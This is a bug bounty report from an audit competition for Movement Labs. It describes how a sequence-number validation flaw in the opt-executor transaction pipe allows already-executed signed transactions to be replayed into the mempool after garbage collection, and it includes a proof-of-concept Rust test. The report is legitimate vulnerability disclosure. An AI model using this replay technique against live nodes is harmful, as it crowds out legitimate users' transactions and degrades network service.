# 41878 \[BC-High] edge case allows replaying user transactions to fill the mempool

## #41878 \[BC-High] Edge-case allows replaying user transactions to fill the mempool

**Submitted on Mar 19th 2025 at 05:13:59 UTC by @Capybara for** [**Attackathon | Movement Labs**](https://immunefi.com/audit-competition/movement-labs-attackathon)

* **Report ID:** #41878
* **Report Type:** Blockchain/DLT
* **Report severity:** High
* **Target:** <https://github.com/immunefi-team/attackathon-movement/tree/main/protocol-units/execution/maptos/opt-executor>
* **Impacts:**
  * Causing network processing nodes to process transactions from the mempool beyond set parameters

### Description

## Summary

Nodes maintain a pool of "**used sequence numbers**" (`UsedSequenceNumberPool`) to ensure that only transactions with valid sequence numbers are added to the mempool.

Transactions will not be inserted if the sequence number is **too old** or **too new**.

Every 30 seconds, the `UsedSequenceNumberPool` clears older records.

An edge case allows a malicious user to insert duplicate transactions in the mempool by combining two flags:

* **1-** The `opt-executor` sends the wrong sequence number to the `TransactionStore` (an in-memory storage for all transactions in the mempool) and the `StateView` (a snapshot of the global state).
* **2-** The pool of "used sequence numbers" (`UsedSequenceNumberPool`) contains the correct value but clears after 30 seconds. The vector becomes possible once the transaction is removed from the pool.

## Details

### Ensuring valid sequence numbers

When submitting a transaction, the function `submit_transaction(transaction: SignedTransaction)` checks the validity of the sequence number

```
let sequence_number = match self.has_invalid_sequence_number(&transaction)? {
	SequenceNumberValidity::Valid(sequence_number) => sequence_number,
	SequenceNumberValidity::Invalid(status) => {
		return Ok(status);
	}
};
```

> <https://github.com/immunefi-team/attackathon-movement/blob/a2790c6ac17b7cf02a69aea172c2b38d2be8ce00/protocol-units/execution/maptos/opt-executor/src/background/transaction\\_pipe.rs#L267-L272>

The function `has_invalid_sequence_number(...)` does the following:

* Reads from the "**used sequence number pool**" the cached value and returns `0` if none.
* Reads the account sequence number from the global state in `get_account_sequence_number`.
* Picks the min possible sequence number as the maximum value between the values extracted in the above two steps.

```
let min_sequence_number = (min_used_sequence_number).max(committed_sequence_number);
```

* Ensures the sequence number of the current transaction is within a valid range:

```
if transaction.sequence_number() < min_sequence_number { ERROR }
if transaction.sequence_number() > max_sequence_number { ERROR }
```

> The max value is calculated as: `committed_sequence_number + TOO_NEW_TOLERANCE` and `TOO_NEW_TOLERANCE` is equal to 32.

Below is the full function as reference:

```
fn has_invalid_sequence_number(
	&self,
	transaction: &SignedTransaction,
) -> Result<SequenceNumberValidity, Error> {
	// check against the used sequence number pool
	let used_sequence_number = self
		.used_sequence_number_pool
		.get_sequence_number(&transaction.sender())
		.unwrap_or(0);
                                                                                            
	// validate against the state view
	let state_view = self.db_reader.latest_state_checkpoint_view().map_err(|e| {
		Error::InternalError(format!("Failed to get latest state view: {:?}", e))
	})?;
                                                                                            
	// this checks that the sequence number is too old or too new
	let committed_sequence_number =
		vm_validator::get_account_sequence_number(&state_view, transaction.sender())?;
                                                                                            
	debug!(
		"Used sequence number: {:?} Committed sequence number: {:?}",
		used_sequence_number, committed_sequence_number
	);
	let min_used_sequence_number =
		if used_sequence_number > 0 { used_sequence_number + 1 } else { 0 };
                                                                                            
	let min_sequence_number = (min_used_sequence_number).max(committed_sequence_number);
                                                                                            
	let max_sequence_number = committed_sequence_number + TOO_NEW_TOLERANCE;
                                                                                            
	info!(
		"min_sequence_number: {:?} max_sequence_number: {:?} transaction_sequence_number {:?}",
		min_sequence_number,
		max_sequence_number,
		transaction.sequence_number()
	);
                                                                                            
	if transaction.sequence_number() < min_sequence_number {
		info!("Transaction sequence number too old: {:?}", transaction.sequence_number());
		return Ok(SequenceNumberValidity::Invalid((
			MempoolStatus::new(MempoolStatusCode::InvalidSeqNumber),
			Some(DiscardedVMStatus::SEQUENCE_NUMBER_TOO_OLD),
		)));
	}
                                                                                            
	if transaction.sequence_number() > max_sequence_number {
		info!("Transaction sequence number too new: {:?}", transaction.sequence_number());
		return Ok(SequenceNumberValidity::Invalid((
			MempoolStatus::new(MempoolStatusCode::InvalidSeqNumber),
			Some(DiscardedVMStatus::SEQUENCE_NUMBER_TOO_NEW),
		)));
	}
                                                                                            
	Ok(SequenceNumberValidity::Valid(committed_sequence_number))
}
```

> <https://github.com/immunefi-team/attackathon-movement/blob/a2790c6ac17b7cf02a69aea172c2b38d2be8ce00/protocol-units/execution/maptos/opt-executor/src/background/transaction\\_pipe.rs#L164-L218>

### Updating an account's latest sequence number

The Movement Network enables users to send transactions with a sequence number up to +32 higher than the account's current sequence number.

If the sequence number of an account is `1`, he's allowed to submit a transaction with `30` as the sequence number, which would be valid.

In such cases, the Transaction Pipe updates the account's sequence number and temporarily saves the most recently used sequence number (30, in our example) into the `UsedSequenceNumberPool`.

Refer to the following test, commented step-by-step so it is easy to understand:

```
// submit a transaction with a valid sequence number (1)

let user_transaction = create_signed_transaction(1, &maptos_config);
let (mempool_status, _) = transaction_pipe.submit_transaction(user_transaction).await?;

// It gets accepted into the mempool
assert_eq!(mempool_status.code, MempoolStatusCode::Accepted);
                                                                                                
// --------------
                                                                                                
// submit a transaction with the same sequence number as the previous one
let user_transaction = create_signed_transaction(1, &maptos_config);
let (mempool_status, _) = transaction_pipe.submit_transaction(user_transaction).await?;

// It gets rejected
assert_eq!(mempool_status.code, MempoolStatusCode::InvalidSeqNumber);
                                          
// --------------
                                                      
// submit a transaction with a sequence number larger than it should be, but still valid (30)
let user_transaction = create_signed_transaction(30, &maptos_config);
let (mempool_status, _) = transaction_pipe.submit_transaction(user_transaction.clone()).await?;

// It gets accepted into the mempool
assert_eq!(mempool_status.code, MempoolStatusCode::Accepted);

```

### The bug

The bug, is that the Transaction Pipie should update the account's sequence number by increasing +1 the value of its latest committed transaction (`30` + `1` = `31`, using our previous example). Instead, it increases +1 the value stored in the global state view for this account (`1` + `1` = `2`).

As a result, in our example, a user with a sequence number of `1` submits a transaction with a sequence number of `30`, it gets executed, and the global state view of his account updates to a sequence number of `2`, (instead of `31`). Fortunately, the `UsedSequenceNumberPool` is updated with the correct value, preventing an immediate replay attack.

But **30 seconds later**, the `UsedSequenceNumberPool` is cleared, returning `0` as the account's sequence number, and the global state view returns `2` (instead of `31`) as the account's sequence number.

When someone maliciously resubmits the exact same signed transaction from that user with the same sequence number it originally had (`30`), it bypasses the check that prevents too old or too new sequence numbers from entering the mempool, and the transaction will be inserted.

The transaction won't get re-executed, but it will take space in the mempool from other legitimate user transactions.

### Impact

The number of transactions stored in the mempool is limited and can be reduced by exploiting the vector outlined in this report.

Replaying transactions to fill the mempool prevents legitimate user transactions from getting processed faster.

From the list of impacts in scope, the one described in this report is: Causing the network nodes to process transactions from the mempool beyond set parameters.

### Proof of Concept

### Proof of Concept

Add the test below to `./attackathon-movement/protocol-units/execution/maptos/opt-executor/src/background/transaction_pipe.rs`

It is very well documented, so it is easy to understand.

• Adds a transaction with sequence number 1; it is accepted into the mempool.\
• Attempts to submit the same sequence number again; it is rejected as InvalidSeqNumber.\
• Adds a transaction with a higher sequence number (30); it is accepted.\
• Delay before checking garbage collection (GC).\
• If the GC interval has elapsed, clean up expired transactions and sequence numbers.\
• The same transaction is submitted again; it is accepted this time.

Code:

```
#[tokio::test]
async fn test_replay_capybara() -> Result<(), anyhow::Error> {
    use tokio::time::{self, Duration};
                                                                                                       
    // set up
    let maptos_config = Config::default();
    let (_context, mut transaction_pipe, _tx_receiver, _tempdir) = setup().await;
                                                                                                       
    // submit a transaction with a valid sequence number (1)
    let user_transaction = create_signed_transaction(1, &maptos_config);
    let (mempool_status, _) = transaction_pipe.submit_transaction(user_transaction).await?;
    // It gets accepted into the mempool
    assert_eq!(mempool_status.code, MempoolStatusCode::Accepted);
                                                                                                       
                                                                                                       
    // submit a transaction with the same sequence number as the previous one
    let user_transaction = create_signed_transaction(1, &maptos_config);
    let (mempool_status, _) = transaction_pipe.submit_transaction(user_transaction).await?;
    // It gets rejected
    assert_eq!(mempool_status.code, MempoolStatusCode::InvalidSeqNumber);
                                                                                                       
    // submit a 2nd transaction with a sequence number larger than it should be, but valid (30)
    // expires in 20 mintes (60 seconds * 2)
    let user_transaction = create_signed_transaction_with_expiration(30, &maptos_config, 1200);
    let (mempool_status, _) = transaction_pipe.submit_transaction(user_transaction.clone()).await?;
    // It gets accepted into the mempool
    assert_eq!(mempool_status.code, MempoolStatusCode::Accepted);
                                                                                                       
    // Wait for 210 seconds
    let epoch_ms_now = chrono::Utc::now().timestamp_millis() as u64;
    println!("{:?}", epoch_ms_now);
    time::sleep(Duration::from_secs(210)).await;
    let epoch_ms_now = chrono::Utc::now().timestamp_millis() as u64;
    println!("{:?}", epoch_ms_now);
                                                                                                       
    // After GC_Interval sequence numbers are gc
    if transaction_pipe.last_gc.elapsed() >= GC_INTERVAL {
        println!("GC_INTERNAL elapsed");
        let now = Instant::now();
        let epoch_ms_now = chrono::Utc::now().timestamp_millis() as u64;
        // garbage collect the used sequence number pool
        transaction_pipe.used_sequence_number_pool.gc(epoch_ms_now);
        // garbage collect the transactions in flight
        {
            let mut transactions_in_flight = transaction_pipe.transactions_in_flight.write().unwrap();
            transactions_in_flight.gc(epoch_ms_now);
        }
        // garbage collect the core mempool
        transaction_pipe.core_mempool.gc();
        transaction_pipe.last_gc = now;
    }
                                                                                                       
    // re-submit the same transaction
    let (mempool_status, _) = transaction_pipe.submit_transaction(user_transaction.clone()).await?;
    // It gets accepted into the mempool
    assert_eq!(mempool_status.code, MempoolStatusCode::Accepted);
                                                                                                       
    // re-submit the same transaction without waiting for GC
    let (mempool_status, _) = transaction_pipe.submit_transaction(user_transaction.clone()).await?;
    // It gets rejected
    assert_eq!(mempool_status.code, MempoolStatusCode::InvalidSeqNumber);
                                                                                                       
    Ok(())
}

// @audit capybara: simplify creating a transaction with custom expiration time
fn create_signed_transaction_with_expiration(sequence_number: u64, chain_config: &Config, seconds: u64) -> SignedTransaction {
    let address = account_config::aptos_test_root_address();
    // @audit capybara: custom function to create a transaction with a custom expiration time
    transaction_test_helpers::get_test_txn_with_chain_id_and_expiration(
        address,
        sequence_number,
        &GENESIS_KEYPAIR.0,
        GENESIS_KEYPAIR.1.clone(),
        chain_config.maptos_chain_id.clone(), // This is the value used in aptos testing code.
        seconds,
    )
}

```

The function below is a helper, and it goes inside aptos-core; `./types/src/test_helpers/transaction_test_helpers.rs`

```
// @audit capybara code
pub fn get_test_txn_with_chain_id_and_expiration(
    sender: AccountAddress,
    sequence_number: u64,
    private_key: &Ed25519PrivateKey,
    public_key: Ed25519PublicKey,
    chain_id: ChainId,
    seconds: u64,
) -> SignedTransaction {
    let expiration_time = expiration_time(seconds);
    let raw_txn = RawTransaction::new_script(
        sender,
        sequence_number,
        Script::new(EMPTY_SCRIPT.to_vec(), vec![], Vec::new()),
        MAX_GAS_AMOUNT,
        TEST_GAS_PRICE,
        expiration_time,
        chain_id,
    );

    let signature = private_key.sign(&raw_txn).unwrap();

    SignedTransaction::new(raw_txn, public_key, signature)
}
```
